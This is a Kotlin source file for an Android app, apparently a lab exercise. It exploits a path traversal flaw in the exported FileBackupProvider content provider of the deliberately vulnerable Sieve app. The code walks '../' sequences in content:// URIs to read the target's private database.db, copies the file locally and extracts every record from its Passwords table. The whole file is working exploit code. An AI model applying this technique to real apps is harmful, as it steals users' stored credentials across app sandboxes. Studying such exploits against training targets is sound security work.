package com.salman.hacksieveprovider

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteException
import android.util.Log
import androidx.core.net.toUri
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import kotlin.coroutines.resume

object SieveProviderBypass {

    /**
     * Sieve application info
     */
    private const val pName = "com.mwr.example.sieve"
    private const val providerName = "FileBackupProvider"
    private const val DATABASE_FILE_NAME = "database.db"
    private const val PASSWORD_TABLE = "Passwords"

    /**
     * Our application info
     */
    private const val DATABASE_COPY_FILE_NAME = "copy_database.db"


    private var database: SQLiteDatabase? = null

    @SuppressLint("SdCardPath")
    fun init(context: Context, resolver: ContentResolver = context.contentResolver): Boolean {
        var inputStream: InputStream? = null
        val traversalIterations = 5 // increase this parameter if you want to look backward more

        for (it in 0 until traversalIterations) {
            val rootDirPath = findTheRootDirectory(it)
            log(rootDirPath)
            val databaseFileUri =
                "${rootDirPath}data/data/${pName}/databases/$DATABASE_FILE_NAME".toUri()
            log(databaseFileUri.toString())

            inputStream = resolver.openInputStream(databaseFileUri)
            if (inputStream != null)
                break

        }

        log("Init: Converting InputStream to Database")
        val databaseFromStream = inputStream?.convertInputStreamToLocalDatabase(context)
        inputStream?.close()

        database = databaseFromStream
        log("Init succeeded: ${database != null}")
        return true
    }

    suspend fun getDatabaseColumns(): List<String>? = suspendCancellableCoroutine { cont ->
        val database = database ?: run {
            cont.resume(null)
            return@suspendCancellableCoroutine
        }

        var cursor: Cursor? = null
        runCatching {
            cursor = database.rawQuery("SELECT * FROM $PASSWORD_TABLE", null)?.also {
                cont.resume(it.columnNames.toList())
            }
        }.onFailure {
            log("getDatabaseColumns: ${it.message}")
        }

        cursor?.close()
        cont.invokeOnCancellation {
            cursor?.close()
        }
    }

    suspend fun getRecords(): List<List<String>> {
        val columns = getDatabaseColumns() ?: run {
            log("getRecords: EMPTY COLUMNS")
            return emptyList()
        }

        val records = mutableListOf<List<String>>()
        suspendCancellableCoroutine { cont ->
            val database = database ?: run {
                cont.resume(null)
                return@suspendCancellableCoroutine
            }

            var _cursor: Cursor? = null
            runCatching {
                val cursor = database.rawQuery("SELECT * FROM $PASSWORD_TABLE", null).also {
                    _cursor = it
                }
                if (cursor.moveToFirst()) {
                    do {
                        val record = mutableListOf<String>()
                        columns.forEach { columnName ->
                            val value = DatabaseHelper.getValueAsString(cursor, columnName)
                            value?.let(record::add)
                        }
                        records.add(record)
                    } while (cursor.moveToNext())
                }
            }.onSuccess {
                cont.resume(records)
            }.onFailure {
                log("Failed to read records $it")
            }

            _cursor?.close()
            cont.invokeOnCancellation {
                _cursor?.close()
            }
        }

        return records
    }

    fun destroy() {
        database?.close()
    }

    /**
     * Apply the path traversal vulnerability to ga backward until we reach the root directory.
     */
    private fun findTheRootDirectory(backwardCount: Int): String {
        val repeatedBackward = "../".repeat(backwardCount)
        return "content://$pName.$providerName/$repeatedBackward"
    }

    /**
     * We can't open a database file directly if we don't have permission to.
     * Using [SQLiteDatabase.openDatabase] requires the full path of the .db file to be accessible
     * But [ContentResolver.openInputStream] will open return a stream of the file's content (bytes)
     * So, write the file's content into [FileOutputStream] for a local database file
     * Now we get a copy of the database' content.
     *
     * @return [SQLiteDatabase]: a database copy or null if we couldn't read bytes
     */
    private fun InputStream.convertInputStreamToLocalDatabase(context: Context): SQLiteDatabase? {
        val parentDatabaseDir = File(context.cacheDir, "databases").apply {
            if (!exists()) {
                mkdirs()
            }
        }
        val databaseCopyFile = File(parentDatabaseDir, DATABASE_COPY_FILE_NAME).apply {
            if (!exists()) createNewFile()
        }

        runCatching {
            val outputStream = FileOutputStream(databaseCopyFile)
            val bufferedReader = buffered()

            bufferedReader.use { inputStream ->
                var length = inputStream.read()
                while (length != -1) {
                    outputStream.write(length)
                    length = inputStream.read()
                }
                outputStream.close()
            }
        }.onFailure {
            log("ConvertISToDB: ${it.message}")
            return null
        }

        return try {
            SQLiteDatabase.openDatabase(
                databaseCopyFile.absolutePath,
                null,
                SQLiteDatabase.OPEN_READONLY
            )
        } catch (ex: SQLiteException) {
            log("Can't open database: ${ex.message}")
            null
        }
    }

    private fun log(message: String?) {
        Log.d("SieveBypass", "log: $message")
    }
}